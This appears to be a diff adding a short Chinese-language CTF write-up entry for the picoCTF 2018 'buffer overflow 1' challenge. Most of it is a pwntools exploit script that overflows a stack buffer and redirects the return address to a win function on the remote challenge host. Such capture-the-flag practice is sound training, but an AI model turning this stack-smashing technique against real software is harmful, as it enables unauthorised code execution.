@@ -470,6 +470,38 @@ if __name__ == "__main__":
     main()
 ```
 
+### picoctf_2018_buffer overflow 1
+
+[题目链接](https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%201)
+
+依旧水，栈溢出，懒得写题解。
+
+```
+## written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27607
+io = remote(host,port)
+# io = process("./Picoctf_2018_buffer_overflow_1")
+elf = ELF("./Picoctf_2018_buffer_overflow_1")
+win = 0x80485CB
+main_addr = elf.sym['main']
+
+def main():
+    io.recvuntil(b"Please enter your string: \n")
+    payload = b'A'*0x2C + p32(win) + p32(main_addr)
+    # gdb.attach(io,"b *0x804865A\nc")
+    # pause()
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
 
 ## 中水区
 
